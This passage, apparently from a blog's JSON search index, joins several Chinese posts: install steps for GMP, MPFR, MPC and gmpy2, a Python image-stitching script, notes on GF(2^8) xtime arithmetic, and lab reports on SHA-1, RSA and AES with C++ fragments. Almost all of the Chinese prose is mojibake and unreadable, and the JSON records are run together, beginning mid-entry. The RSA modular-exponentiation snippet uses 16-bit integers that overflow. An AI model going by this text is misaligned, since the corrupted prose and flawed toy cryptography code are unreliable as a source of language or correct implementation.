â›”ï¸æŠ¥é”™ï¼šNo usable m4 in $PATH or &#x2F;usr&#x2F;5bin (see config.log for reasons) 12345cdsudo apt-get install m4cd gmp-6.2.0./configure --prefix=/usr/local/gmpmake &amp;&amp; make install å®‰è£…mpfråŒ…ï¼š12345wget https://www.mpfr.org/mpfr-current/mpfr-4.1.0.tar.gztar xvf mpfr-4.1.0.tar.gzcd mpfr-4.1.0./configure --prefix=/usr/local/mpfr --with-gmp=/usr/local/gmpmake &amp;&amp; make install å®‰è£…mpc apt-getçš„æ–¹å¼ä¸‹è½½ 1apt-get install libmpc-dev ä¼šåŒæ—¶å®‰è£…libmpfr-dev 1apt-get install libgmp-dev æŠ¥é”™ 1apt-get update 1apt-get install libgmp-dev æˆåŠŸ 1234wget ftp://ftp.gnu.org/gnu/mpc/mpc-1.0.3.tar.gztar xvf mpc-1.0.3.tar.gzcd mpc-1.0.3./configure --prefix=/usr/local/mpc --with-gmp=/usr/local/gmp --with-mpfr=/usr/local/mpfr make &amp;&amp; make install error: conflicting types for â€˜mpfr_fmmaâ€™ ä¸è¦ç®¡è¿™ä¸ªæŠ¥é”™ï¼Œæ˜¯ä¸ªè½¯è¿æ¥çš„é—®é¢˜ã€‚å¾ˆéº»çƒ¦ã€‚ å®‰è£…gmpy2pip install gmpy2 tipï¼šå…¶ä»–ä¸‹è½½mpcçš„æ–¹å¼åœ¨æ–‡ä»¶å¤¹å†…è¾“å…¥åœ°å€ã€‚mpcä¸‹è½½ è·å–GCCåŸºç¡€æ¶æ„ï¼š 12[ftp://gcc.gnu.org/pub/gcc/infrastructure/](ftp://gcc.gnu.org/pub/gcc/infrastructure/)å°†ä¸‹è½½æ–‡ä»¶æ”¾åœ¨ä¸´æ—¶ç›®å½•ä¸­(æ‚¨å¯ä»¥ä½¿ç”¨æ‰€éœ€çš„ä»»ä½•ç›®å½•)ã€‚ 12/opt/downloadsåœ¨ä¸downloadsç›®å½•æˆ–å…¶å­ç›®å½•ä¸åŒçš„tempç›®å½•ä¸­æ„å»ºåŸºç¡€ç»“æ„ï¼š 123/tmp/gccä½¿ç”¨é™æ€åº“é…ç½®åŸºç¡€æ¶æ„ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š./configure --disable-shared --enable-static --prefix=/tmp/gcc","categories":[{"name":"å¯†ç å­¦","slug":"å¯†ç å­¦","permalink":"https://gryffinbit.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"kali","slug":"kali","permalink":"https://gryffinbit.top/tags/kali/"},{"name":"gmpy2","slug":"gmpy2","permalink":"https://gryffinbit.top/tags/gmpy2/"}],"author":"Gryffinbit"},{"title":"å›¾ç‰‡æ‹¼æ¥","slug":"å›¾ç‰‡æ‹¼æ¥","date":"2020-11-14T21:03:28.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2020/11/15/å›¾ç‰‡æ‹¼æ¥/","permalink":"https://gryffinbit.top/2020/11/15/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435import PIL.Image as Imageimport os IMAGES_PATH = &#x27;./å°±è¿™?/&#x27; # å›¾ç‰‡é›†åœ°å€IMAGES_FORMAT = [&#x27;.jpg&#x27;, &#x27;.JPG&#x27;, &#x27;png&#x27;] # å›¾ç‰‡æ ¼å¼IMAGE_WIDTH = 15 # æ¯å¼ å›¾ç‰‡çš„å®½åº¦IMAGE_HEIGHT = 15 # æ¯å¼ å›¾ç‰‡çš„é«˜åº¦IMAGE_ROW = 21 # å›¾ç‰‡é—´éš”ï¼Œä¹Ÿå°±æ˜¯åˆå¹¶æˆä¸€å¼ å›¾åï¼Œä¸€å…±æœ‰å‡ è¡ŒIMAGE_COLUMN = 21 # å›¾ç‰‡é—´éš”ï¼Œä¹Ÿå°±æ˜¯åˆå¹¶æˆä¸€å¼ å›¾åï¼Œä¸€å…±æœ‰å‡ åˆ—IMAGE_SAVE_PATH = &#x27;final2.jpg&#x27; # å›¾ç‰‡è½¬æ¢åçš„åœ°å€ # è·å–å›¾ç‰‡é›†åœ°å€ä¸‹çš„æ‰€æœ‰å›¾ç‰‡åç§°image_names = [name for name in os.listdir(IMAGES_PATH) for item in IMAGES_FORMAT if os.path.splitext(name)[1] == item]image_names.sort(key=lambda x: int(x[4:-4])) #æŒ‰æ–‡ä»¶çš„åºå·æ’åºï¼Œä»æ–‡ä»¶åæ­£æ•°çš„ç¬¬4ä½åˆ°å€’æ•°çš„ç¬¬4ä½å–æ•´æ•°print(len(image_names)) # ç®€å•çš„å¯¹äºå‚æ•°çš„è®¾å®šå’Œå®é™…å›¾ç‰‡é›†çš„å¤§å°è¿›è¡Œæ•°é‡åˆ¤æ–­if len(image_names) != IMAGE_ROW * IMAGE_COLUMN: raise ValueError(&quot;åˆæˆå›¾ç‰‡çš„å‚æ•°å’Œè¦æ±‚çš„æ•°é‡ä¸èƒ½åŒ¹é…ï¼&quot;) # å®šä¹‰å›¾åƒæ‹¼æ¥å‡½æ•°def image_compose(): to_image = Image.new(&#x27;RGB&#x27;, (IMAGE_COLUMN * IMAGE_WIDTH, IMAGE_ROW * IMAGE_HEIGHT)) #åˆ›å»ºä¸€ä¸ªæ–°å›¾ # å¾ªç¯éå†ï¼ŒæŠŠæ¯å¼ å›¾ç‰‡æŒ‰é¡ºåºç²˜è´´åˆ°å¯¹åº”ä½ç½®ä¸Š for y in range(1, IMAGE_ROW + 1): for x in range(1, IMAGE_COLUMN + 1): from_image = Image.open(IMAGES_PATH + image_names[IMAGE_COLUMN * (y - 1) + x - 1]).resize( (IMAGE_WIDTH, IMAGE_HEIGHT),Image.ANTIALIAS) to_image.paste(from_image, ((x - 1) * IMAGE_WIDTH, (y - 1) * IMAGE_HEIGHT)) return to_image.save(IMAGE_SAVE_PATH) # ä¿å­˜æ–°å›¾image_compose() #è°ƒç”¨å‡½æ•°","categories":[{"name":"Misc","slug":"Misc","permalink":"https://gryffinbit.top/categories/Misc/"}],"tags":[{"name":"å›¾ç‰‡","slug":"å›¾ç‰‡","permalink":"https://gryffinbit.top/tags/%E5%9B%BE%E7%89%87/"},{"name":"Python","slug":"Python","permalink":"https://gryffinbit.top/tags/Python/"}],"author":"Gryffinbit"},{"title":"xtimeç®—æ³•","slug":"xtimeç®—æ³•","date":"2020-11-14T19:57:37.000Z","updated":"2024-11-12T06:59:01.000Z","comments":true,"path":"2020/11/15/xtimeç®—æ³•/","permalink":"https://gryffinbit.top/2020/11/15/xtime%E7%AE%97%E6%B3%95/","excerpt":"","text":"xtimeç®—æ³•ç†è®ºåŸºç¡€ï¼š C(x)&#x3D;A(x)B(x) mod P(x)äºŒè¿›åˆ¶æ•°è½¬æ¢ä¸ºå¤šé¡¹å¼:A(a7,a6,a5,a4,a3,a2,a1,a0)&#x3D;&#x3D;&gt;A(X)&#x3D;a7x7+a6x6+a5x5+a4x4+a3x3+a2x2+a1x+a0ï¼ŒGF(28)å†…çš„æœ€å¤§å€¼ä¸º(11111111)2&#x3D;&#x3D;&gt; x7+x6+x5+x4+x3+x2+x+1ï¼ŒP(x)&#x3D;x8+x4+x3+x2+x+1&#x3D;&#x3D;&gt;(100011011)2&#x3D;0x11BX8 mod P(x)&#x3D; x4+x3+x2+x+1â€”â€”â€”â€”â€”â€”x8é™¤ä»¥P(x)çš„ä½™æ•°å¼‚æˆ–è¿ç®—ï¼š0âŠ•0&#x3D;0, 0âŠ•1&#x3D;1, 1âŠ•1&#x3D;0æœ‰é™åŸŸGF(2n)åŠ æ³•ï¼šC(x)&#x3D;A(x)+B(x)&#x3D;âˆ‘cixi(0â‰¤iâ‰¤m-1)ï¼Œci&#x3D;ai+bi mod 2å³aiâŠ•biï¼ŒA(x)&#x3D;(am-1,â€¦,a3,a2,a1,a0)2ï¼ŒB(x)&#x3D;(bm-1,â€¦,b3,b2,b1,b0)2å®šä¹‰xtime()è¿ç®—ï¼šè®¾A(x)âˆˆGF(28),A(x)&#x3D;a7x7+a6x6+a5x5+a4x4+a3x3+a2x2+a1x+a0å¯¹åº”çš„äºŒè¿›åˆ¶æ•°ä¸º(a7,a6,a5,a4,a3,a2,a1,a0)åˆ™xtime(A(x))&#x3D;xA(x)&#x3D; a7x8+a6x7+a5x6+a4x5+a3x4+a2x3+a1x2+a0xå¯¹åº”çš„äºŒè¿›åˆ¶æ•°ä¸º(a7,a6,a5,a4,a3,a2,a1,a0,0)ã€‚å°†A(x)å·¦ç§»ä¸€ä½(æœ€ä½ä½è¡¥0ï¼ŒåŸå…ˆçš„æœ€é«˜ä½åˆ é™¤)çš„ç»“æœä¸º(a6,a5,a4,a3,a2,a1,a0,0)ï¼Œå¦‚æœa7&#x3D;0ï¼Œåˆ™A(x)å·¦ç§»ä¸€ä½çš„ç»“æœå°±æ˜¯xtime(A(x))çš„å€¼ï¼›å¦‚æœa7&#x3D;1,åˆ™A(x)å·¦ç§»ä¸€ä½çš„ç»“æœä¸0x1Bé€æ¯”ç‰¹å¼‚æˆ–(å¼‚æˆ–è¿ç®—ç¬¦âŠ•)å³ä¸ºxtime(A(x))çš„å€¼ã€‚(a7&#x3D;1æ—¶ï¼Œx*A(x)çš„å€¼è¶…å‡ºGF(28)ï¼Œéœ€è¦ æ¨¡P(x),ç»“æœä¸ºA(x) å·¦ç§»ä¸€ä½çš„ç»“æœä¸º(a6,a5,a4,a3,a2,a1,a0,0)ä¸0x1Bé€æ¯”ç‰¹å¼‚æˆ–çš„å€¼)ä¾‹é¢˜ï¼š ä¾‹é¢˜1ï¼š è®¾0x64âˆˆGF(28)ï¼Œæ±‚xtime(0x64)çš„å€¼ï¼Ÿ0x64è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°ä¸º(0110 0100)2ï¼Œæœ€é«˜ä½a7&#x3D;0,æ‰€ä»¥0x64å·¦ç§»ä¸€ä½çš„ç»“æœå°±æ˜¯æ‰€æ±‚å€¼ï¼Œ(0110 0100)2å·¦ç§»ä¸€ä½åçš„å€¼ä¸º(110 01000)2ä¾‹é¢˜2ï¼š åœ¨GF(28)ä¸­è®¡ç®—0x570x13çš„ç»“æœï¼Ÿå…ˆå°†166è¿›åˆ¶æ•°è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°ï¼š0x57&#x3D;(0101 0111)2,0x13&#x3D;(0001 0011)2å°†äºŒè¿›åˆ¶æ•°è½¬æ¢ä¸ºå¤šé¡¹å¼ï¼š0x13&#x3D;x4+x+10x570x13&#x3D;0x57*(x4+x+1)&#x3D;0x57x4+0x57x+0x570x57xå°±æ˜¯xtime(0x57)&#x3D;(1010 1110)20x57x2å°±æ˜¯xtime(0x57x)&#x3D;(0101 1100)+(0001 1011)&#x3D;(0100 0111)2åŒç†0x57x3&#x3D;(10001110)2,ï¼Œ0x57x4&#x3D;(0000 0111)2æ‰€ä»¥0x570x13&#x3D;(00000111)2+(1010 1110)2+(0101 0111)2","categories":[{"name":"å¯†ç å­¦","slug":"å¯†ç å­¦","permalink":"https://gryffinbit.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[],"author":"Gryffinbit"},{"title":"SHA-1","slug":"SHA-1","date":"2020-11-14T19:44:46.000Z","updated":"2024-11-12T06:59:22.000Z","comments":true,"path":"2020/11/15/SHA-1/","permalink":"https://gryffinbit.top/2020/11/15/SHA-1/","excerpt":"","text":"SHA-1å®éªŒæŠ¥å‘Šä¸€ã€å®éªŒé¢˜ç›®SHA-åŠ å¯†ç®—æ³• äºŒã€å®éªŒç›®çš„å’Œè¦æ±‚ç†Ÿæ‚‰SHA-1ç®—æ³•çš„è¿è¡Œè¿‡ç¨‹ï¼Œä½¿ç”¨C++è¯­è¨€ç¼–å†™å®ç°SHA-1ç®—æ³•ç¨‹åºï¼Œå¢åŠ å¯¹æ‘˜è¦å‡½æ•°çš„ç†è§£ã€‚ ç†è§£ SHA-1 è½®å‡½æ•°çš„å®šä¹‰å’Œå·¥ä½œè¿‡ç¨‹ã€‚å®ç° SHA-1 å“ˆå¸Œç®—æ³•ã€‚åˆ†æ SHA-1 ç®—æ³•è¿è¡Œæ€§èƒ½ã€‚ ä¸‰ã€å®éªŒç¯å¢ƒclion å››ã€å®éªŒå†…å®¹ç»™å®šçš„ SHA-1 å¯¹å•ä¸ª 512 åˆ†ç»„å¤„ç†ç»“æ„å¦‚å›¾ï¼Œç¨‹åºå®ŒæˆåŠŸèƒ½ï¼š äº”ã€ç®—æ³•æè¿°åŠå®éªŒæ­¥éª¤ï¼ˆ1ï¼‰ æ¶ˆæ¯å¡«å……ï¼šæ¶ˆæ¯è½¬åŒ–ä¸ºä½å­—ç¬¦ä¸²ï¼›å­—ç¬¦ä¸²è¡¥ä½ï¼›é™„åŠ æ¶ˆæ¯é•¿åº¦ã€‚ ï¼ˆ2ï¼‰ åˆå§‹åŒ–ç¼“å­˜ï¼š5 ä¸ª 32 ä½çš„ç¼“å­˜å­—ï¼Œå¤§ç«¯å¡«å……ã€‚ ï¼ˆ3ï¼‰ è®¾ç½®å¿…è¦æ“ä½œå’Œå‡½æ•°ï¼šå¾ªç¯å·¦ç§»ä½ï¼Œè½®å¸¸é‡Kğ‘¡ï¼Œè½®é€»è¾‘å‡½æ•°ï¼ˆæ¯ 20 æ­¥ æ›´æ–°ä¸€ä¸ªï¼‰ ï¼ˆ4ï¼‰ 16 ä¸ªæ¶ˆæ¯å­—æ‰©å±•ä¸º 80 ä¸ªå­— ï¼ˆ5ï¼‰ 80 æ­¥è¿­ä»£ï¼šæ¶ˆæ¯å­—ï¼Œå·¦ç§»å¾ªç¯ï¼Œé€»è¾‘å‡½æ•°ï¼Œè½®å¸¸é‡ï¼Œæ›´æ–°ç¼“å­˜å­—ã€‚ ğ´, ğµ, ğ¶,ğ·, ğ¸ â† (ğ¸ + ğ‘“ğ‘¡(ğµ, ğ¶,ğ·) + ğ¶Lğ‘†5(ğ´) + ğ‘Šğ‘¡ + ğ¾ğ‘¡), ğ´, ğ¶Lğ‘†30(ğµ), ğ¶,ğ· ï¼ˆ6ï¼‰ è€Œåå†ç”¨ç¼“å­˜å­—åˆå§‹å€¼å¼‚æˆ–è¾“å‡º 160 ä½æ‘˜è¦ã€‚ å…­ã€è°ƒè¯•è¿‡ç¨‹åŠç»“æœï¼ˆé™„æˆªå›¾ï¼‰âœ¨LPTSTR æ›¿æ¢ä¸º char* âœ¨è¾“å‡ºç»“æœ ä¸ƒã€æ€»ç»“ä½“ä¼šâ“ä»£ç å¦‚ä½•å®ç°æ¶ˆæ¯åˆå§‹å¡«å……çš„è¿‡ç¨‹ï¼Ÿ æ¶ˆæ¯å¡«å……ï¼šæ¶ˆæ¯è½¬åŒ–ä¸ºä½å­—ç¬¦ä¸²ï¼›è¾“å…¥æ˜¯æŒ‰ 512 ä½ï¼ˆ16ä¸ªå­—ï¼‰çš„åˆ†ç»„è¿›è¡Œå¤„ç†çš„ã€‚å­—ç¬¦ä¸²è¡¥ä½ï¼›é™„åŠ æ¶ˆæ¯é•¿åº¦ã€‚ è¡¥ä½ åŸå§‹æ¶ˆæ¯å¿…é¡»è¿›è¡Œè¡¥ä½ï¼Œä»¥ä½¿å…¶é•¿åº¦åœ¨å¯¹512å–æ¨¡ä»¥åçš„ä½™æ•°æ˜¯448ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œï¼ˆè¡¥ä½åçš„æ¶ˆæ¯é•¿åº¦ï¼‰%512 &#x3D; 448ã€‚å³ä½¿é•¿åº¦å·²ç»æ»¡è¶³å¯¹512å–æ¨¡åä½™æ•°æ˜¯448ï¼Œè¡¥ä½ä¹Ÿå¿…é¡»è¦è¿›è¡Œã€‚ è¡¥ä½æ˜¯è¿™æ ·è¿›è¡Œçš„ï¼šå…ˆè¡¥ä¸€ä¸ª1ï¼Œç„¶åå†è¡¥0 ï¼Œç›´åˆ°é•¿åº¦æ»¡è¶³å¯¹512å–æ¨¡åä½™æ•°æ˜¯448ã€‚æ€»è€Œè¨€ä¹‹ï¼Œè¡¥ä½æ˜¯è‡³å°‘è¡¥ä¸€ä½ï¼Œæœ€å¤šè¡¥512ä½ã€‚ è¡¥é•¿åº¦ å°±æ˜¯å°†åŸå§‹æ•°æ®çš„é•¿åº¦è¡¥åˆ°å·²ç»è¿›è¡Œäº†è¡¥ä½æ“ä½œçš„æ¶ˆæ¯åé¢ã€‚é€šå¸¸ç”¨ä¸¤ä¸ªå­—ï¼ˆ64ä½ï¼‰æ¥è¡¨ç¤ºåŸå§‹æ¶ˆæ¯çš„é•¿åº¦ã€‚å¦‚æœæ¶ˆæ¯é•¿åº¦ä¸å¤§äº2^64ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå­—å°±æ˜¯0ã€‚","categories":[{"name":"å¯†ç å­¦","slug":"å¯†ç å­¦","permalink":"https://gryffinbit.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"SHA-1","slug":"SHA-1","permalink":"https://gryffinbit.top/tags/SHA-1/"},{"name":"æ•£åˆ—å‡½æ•°","slug":"æ•£åˆ—å‡½æ•°","permalink":"https://gryffinbit.top/tags/%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B0/"}],"author":"Gryffinbit"},{"title":"RSAå®éªŒ","slug":"RSAå®éªŒ","date":"2020-11-14T19:32:14.000Z","updated":"2024-11-12T06:59:24.000Z","comments":true,"path":"2020/11/15/RSAå®éªŒ/","permalink":"https://gryffinbit.top/2020/11/15/RSA%E5%AE%9E%E9%AA%8C/","excerpt":"","text":"ä¸€ã€å®éªŒé¢˜ç›®RSAåŠ å¯†ç®—æ³• äºŒã€å®éªŒç›®çš„å’Œè¦æ±‚ç†Ÿæ‚‰RSAåŠ è§£å¯†ç®—æ³•çš„è¿è¡Œè¿‡ç¨‹ï¼Œä½¿ç”¨C++è¯­è¨€ç¼–å†™å®ç°RSAç®—æ³•ç¨‹åºï¼ŒåŠ æ·±å¯¹ç´ æ•°ç­›é€‰å’Œä½¿ç”¨çš„ç†è§£ã€‚ ä¸‰ã€å®éªŒç¯å¢ƒclion å››ã€å®éªŒå†…å®¹ç»™å®š RSA ç®—æ³•ç»“æ„ ä¸€ã€å‚æ•°å’Œå¯†é’¥ç”Ÿæˆï¼š 1.éšæœºä¸¤ä¸ªå¤§ç´ æ•°ğ‘å’Œğ‘ï¼Œä¿å¯†ï¼› è®¡ç®—ğ‘› &#x3D; ğ‘ Ã— ğ‘ï¼Œå…¬å¼€ã€‚è®¡ç®—æ¬§æ‹‰å‡½æ•°ğœ‘(ğ‘›) &#x3D; (ğ‘ âˆ’ 1)(ğ‘ âˆ’ 1)ã€‚ 3.éšæœºé€‰å–æ•´æ•°ğ‘’ï¼Œgcd(ğ‘’,ğœ‘(ğ‘›)) &#x3D; 1ã€‚ 4.è®¡ç®—dï¼š $$d&#x3D;e^{-1}mod \\ \\varphi(n)$$ 5.å…¬é’¥ä¸ºï¼ˆğ‘’, ğ‘›ï¼‰ï¼Œç§é’¥ä¸ºï¼ˆğ‘‘ï¼Œnï¼‰ã€‚ äºŒã€åŠ å¯†ï¼š $$c\\equiv m^emod\\ n$$ ä¸‰ã€è§£å¯†ï¼š $$m\\equiv c^d mod\\ n$$ å®ç°åŠŸèƒ½ï¼š ï¼ˆ1ï¼‰ RSA ç®—æ³•å¯†é’¥ç”Ÿæˆï¼Œå­˜æ”¾ä¸¤ä¸ªä¸åŒæ–‡ä»¶ã€‚ ï¼ˆ2ï¼‰ RSA åŠ å¯†æ–‡ä»¶ï¼Œè¯»å…¥å…¬é’¥æ–‡ä»¶ï¼Œè¯»å…¥å¾…åŠ å¯†æ–‡ä»¶ï¼Œè¾“å‡ºå¯†æ–‡æ–‡ä»¶ã€‚ ï¼ˆ3ï¼‰ RSA è§£å¯†æ–‡ä»¶ï¼Œè¯»å…¥ç§é’¥æ–‡ä»¶ï¼Œè¯»å…¥å¾…è§£å¯†æ–‡ä»¶ï¼Œè¾“å‡ºæ˜æ–‡æ–‡ä»¶ã€‚ äº”ã€ç®—æ³•æè¿°åŠå®éªŒæ­¥éª¤å¯»æ‰¾å¤§ç´ æ•°pã€qï¼šï¼ˆäº§ç”Ÿæ–°å¯†é’¥æ—¶ï¼‰ éšæœºé€‰å–å¥‡æ•°ï¼Œåœ¨ç´ æ€§æ£€éªŒç®—æ³•åˆ¤æ–­æ˜¯å¦ä¸ºç´ æ•°ã€‚é‡å¤æ“ä½œï¼Œç›´åˆ°é€‰å–å‡ºç¬¦åˆæ¡ä»¶çš„ç´ æ•°ã€‚ éšæœºé€‰å–æ•´æ•°ğ‘’: $$gcd(e,\\varphi(n))&#x3D;1$$ $$d&#x3D;e^{-1}mod \\ \\varphi(n)$$ ç”±æ¨å¹¿Euclidç®—æ³•å®Œæˆ å…­ã€è°ƒè¯•è¿‡ç¨‹åŠç»“æœï¼ˆé™„æˆªå›¾ï¼‰âœ¨ int64 çš„è§„èŒƒå†™æ³•ï¼š int64_t âœ¨ unsigned __int64_t a æ›¿æ¢ä¸º u_int64_t âœ¨64ä½é•¿æ•´å‹ï¼ŒLinux&#x2F;macOSä¸‹æ”¹æˆ%lld âœ¨NULLçš„è§„èŒƒä½¿ç”¨ï¼Œæ”¹ä¸ºnullptr åŠ å¯†å†…å®¹ï¼špleas å¯¹åº”ä¸ºï¼š1612050119 ä¸ƒã€æ€»ç»“ä½“ä¼šâ“ä»£ç å¦‚ä½•è¿›è¡Œç´ æ€§æ£€æµ‹ï¼Œå¦‚ä½•è¿›è¡Œæ¨¡å¹‚è¿ç®—ï¼ŒåŠ è§£å¯†æ–‡ä»¶çš„ç­–ç•¥ï¼Ÿ â€¼ï¸ç´ æ€§æ£€éªŒï¼š è´¨æ•°ç­›é€‰å®šç†ï¼šnä¸èƒ½å¤Ÿè¢«ä¸å¤§äºæ ¹å·nçš„ä»»ä½•è´¨æ•°æ•´é™¤ï¼Œåˆ™næ˜¯ä¸€ä¸ªè´¨æ•° m&#x3D;(__int64_t)sqrt(n)+1 æ‰€ä»¥Primer[i]&lt;&#x3D;m ï¼Œå½“ä¸èƒ½è¢«næ•´é™¤æ—¶ï¼Œreturn trueåˆ™næ˜¯è´¨æ•°ã€‚ 12345678bool RSA::IsPrimer(__int64_t n)&#123; __int64_t m=(__int64_t)sqrt(n)+1,i; for(i=0;Primer[i]&lt;=m;i++) if(n%Primer[i]==0) return false; return true;&#125; â€¼ï¸æ¨¡ğœ‘(ğ‘›)è¿ç®—ï¼šé‡‡ç”¨ä¸€èˆ¬å–æ¨¡çš„æ–¹å¼ $$ï¼ˆa^n) %m&#x3D; ((a%m)^n)%m \\ \\ \\ \\ \\ \\ \\ \\ \\ å¾ªç¯næ¬¡å–æ¨¡ï¼ŒæŠ˜åŠæŸ¥æ‰¾ $$ 12345678910111213__int64_t RSA::Mod(u_int16_t a,u_int16_t b,u_int16_t n)&#123; u_int16_t t=1; a%=n; while(b) &#123; if(b%2) t=(t*a)%n; a=(a*a)%n; b/=2; &#125; return (__int64_t)t;&#125; â€¼ï¸åŠ è§£å¯†æ–‡ä»¶çš„ç­–ç•¥ï¼š åˆ©ç”¨freadã€fwriteç­‰å‡½æ•°ï¼Œè¯»å–å…¬ç§é’¥ï¼Œæ ¹æ®å‰é¢æåˆ°çš„åŠ è§£å¯†ç®—æ³•ï¼Œè¿›è¡Œæ“ä½œã€‚å¹¶å°†ç»“æœfwriteå†™å…¥åˆ°æ–‡æœ¬ä¸­","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"å¯†ç å­¦","slug":"å®éªŒ/å¯†ç å­¦","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"RSA","slug":"RSA","permalink":"https://gryffinbit.top/tags/RSA/"}],"author":"Gryffinbit"},{"title":"AESå®éªŒæŠ¥å‘Š","slug":"AESå®éªŒ","date":"2020-11-14T19:24:19.000Z","updated":"2024-11-12T06:59:50.000Z","comments":true,"path":"2020/11/15/AESå®éªŒ/","permalink":"https://gryffinbit.top/2020/11/15/AES%E5%AE%9E%E9%AA%8C/","excerpt":"","text":"AESå®éªŒæŠ¥å‘Šä¸€ã€å®éªŒé¢˜ç›®AESåŠ å¯†ç®—æ³• äºŒã€å®éªŒç›®çš„å’Œè¦æ±‚é€šè¿‡å®éªŒï¼ŒæŒæ¡AESå¯†ç çš„ç¨‹åºå®ç°ï¼Œç†Ÿæ‚‰æ¯”ç‰¹ä¸²çš„æ“ä½œï¼ŒçŸ©é˜µå˜æ¢ï¼Œæœ‰é™åŸŸä¸Šçš„ä¹˜æ³•ï¼Œæé«˜C++ç¨‹åºè®¾è®¡èƒ½åŠ›. ç¼–å†™ AES å¯†ç çš„åŠ å¯†è§£å¯†ç¨‹åºï¼Œè¿è¡Œå¹¶éªŒè¯ã€‚ (1) è¾“å…¥ 128 æ¯”ç‰¹æ˜æ–‡å’Œå¯†æ–‡ï¼Œåˆ©ç”¨ AES å¯†ç å¯¹å…¶åŠ å¯†å¹¶è¾“å‡ºå¯†æ–‡ã€‚ (2) è¾“å…¥ AES åŠ å¯†çš„ 128 æ¯”ç‰¹å¯†æ–‡å’Œå¯†é’¥ï¼Œå¯¹å…¶è¿›è¡Œè§£å¯†ã€‚ (3) è®°å½•è°ƒè¯•å’ŒéªŒè¯è¿‡ç¨‹ï¼Œå®Œæˆå®éªŒæŠ¥å‘Šã€‚ ä¸‰ã€å®éªŒç¯å¢ƒclion å››ã€å®éªŒå†…å®¹1. AES ç®—æ³•ï¼š åŒ…æ‹¬ï¼šå­—èŠ‚ä»£æ¢ï¼Œè¡Œç§»ä½ï¼Œåˆ—æ··åˆï¼Œå¯†é’¥åŠ ã€‚ 128 æ¯”ç‰¹çš„ç§å­å¯†é’¥ğ‘ğ‘˜ &#x3D; 4ï¼Œå³ 4 ä¸ª 32 æ¯”ç‰¹çš„å¯†é’¥å­—ï¼Œæ¯ä¸ªå¯†é’¥å­—æ˜¯ç”± 4 ä¸ªå­— èŠ‚æ„æˆï¼Œå½¢æˆ 4Ã—4 çš„çŸ©é˜µã€‚ä¸€ä¸ªå­— 4 è¡Œï¼Œ4 ä¸ªå­— 4 åˆ—ã€‚ 128 æ¯”ç‰¹çš„åˆ†ç»„é•¿åº¦ğ‘ğ‘ &#x3D; 4ï¼Œå³ 4 ä¸ª 32 æ¯”ç‰¹çš„å­—ï¼Œæ¯ä¸ªå­—æ˜¯ç”± 4 ä¸ªå­—èŠ‚æ„æˆï¼Œ å½¢æˆ 4Ã—4 çš„çŸ©é˜µã€‚ä¸€ä¸ªå­— 4 è¡Œï¼Œ4 ä¸ªå­— 4 åˆ—ã€‚ çŸ©é˜µæŒ‰ç…§åˆ—ä¸ºä¸»ç´¢å¼•ï¼Œç¬¬ä¸€è¡Œï¼Œ0ï¼Œ4ï¼Œ8ï¼Œ12ã€‚ 2. æ¯ä¸€ä¸ªå…ƒç´ çš„è¿ç®—å…·ä½“æ¶‰åŠæœ‰é™åŸŸçš„ä¹˜æ³•ï¼Œå¹‚è¿ç®—ï¼Œæ±‚é€†å…ƒã€‚ è¡¨ç¤ºä¸€ä¸ªå…ƒç´ ï¼šä¸¤ä¸ª 16 è¿›åˆ¶ï¼Œ8 ä½ï¼Œä¸€ä¸ªå­—èŠ‚ã€‚ äº”ã€ç®—æ³•æè¿°åŠå®éªŒæ­¥éª¤1234567891011121.KeyExpansionsâ€”-è½®å¯†é’¥ä½¿ç”¨Rijndaelç®—æ³•çš„å¯†é’¥ç¼–æ’å¯†ç å¯†é’¥å¯¼å‡ºã€‚ AESéœ€è¦ä¸ºæ¯ä¸ªå›åˆåŠ ä¸€ä¸ªå•ç‹¬çš„128ä½çš„å¾ªç¯å¯†é’¥å—2.AddRoundKeyâ€”å¯†é’¥åŠ ï¼šå°†è½®å¯†é’¥ä¸çŠ¶æ€è¿›è¡Œé€æ¯”ç‰¹å¼‚æˆ–3.è½®å‡½æ•°éƒ¨åˆ†ï¼š SubBytesâ€”-Sç›’ï¼šéçº¿æ€§æ›¿ä»£æ­¥éª¤ï¼Œå…¶ä¸­æ ¹æ®æŸ¥æ‰¾è¡¨å°†æ¯ä¸ªå­—èŠ‚æ›¿æ¢ä¸ºå¦ä¸€ä¸ªã€‚ ShiftRowsâ€”-è¡Œç§»ä½ï¼šä¸€ç§è½¬ç½®æ­¥éª¤ï¼Œå…¶ä¸­çŠ¶æ€çš„æœ€åä¸‰è¡Œå¾ªç¯åœ°ç§»åŠ¨ä¸€å®šæ•°é‡çš„æ­¥éª¤ã€‚ MixColumnsâ€”åˆ—æ··æ·†ï¼šå…¶æ“ä½œåœ¨çŠ¶æ€çš„åˆ—ä¸Šï¼Œç»„åˆæ¯åˆ—ä¸­çš„å››ä¸ªå­—èŠ‚ã€‚ AddRoundKey--å¯†é’¥åŠ  æœ€åä¸€è½®ï¼š SubBytes ShiftRows AddRoundKey AESè½®å‡½æ•°è¿‡ç¨‹ï¼šå­—èŠ‚æ›¿æ¢ï¼ˆSubBytesï¼‰ï¼šSç›’æŠŠå­—èŠ‚æ˜ å°„åˆ°è‡ªå·±çš„ä¹˜æ³•é€†å…ƒï¼Œå†å¯¹å­—èŠ‚åšä»¿å°„å˜æ¢ è¡Œç§»ä½ï¼ˆShiftRowsï¼‰ï¼šå°†çŠ¶æ€é˜µåˆ—çš„å„è¡Œï¼Œè¿›è¡Œå¾ªç¯ç§»ä½ã€‚ä¸åŒè¡Œä½ç§»é‡ä¸åŒã€‚ä½ç§»é‡çš„å–å€¼ä¸Nbæœ‰å…³ 